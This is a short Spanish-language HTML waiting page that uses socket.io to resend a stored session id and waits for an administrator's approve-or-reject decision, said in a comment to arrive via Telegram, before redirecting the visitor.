<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Esperando Aprobación</title>
</head>
<body>
  <h2>🔐 Esperando decisión del administrador...</h2>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sessionId = localStorage.getItem('sessionId');

    // Enviar sessionId al servidor para reconectar
    if (sessionId) {
      socket.emit("reconectar", sessionId);
    } else {
      alert("No se encontró el sessionId. Vuelve a iniciar el proceso.");
    }

    // Escuchar la respuesta desde Telegram
    socket.on("respuesta", (decision) => {
      if (decision === "aprobado") {
        window.location.href = "/bienvenido.html";
      } else if (decision === "rechazado") {
        window.location.href = "/denegado.html";
      } else {
        alert("Respuesta desconocida del servidor.");
      }
    });
  </script>
</body>
</html>
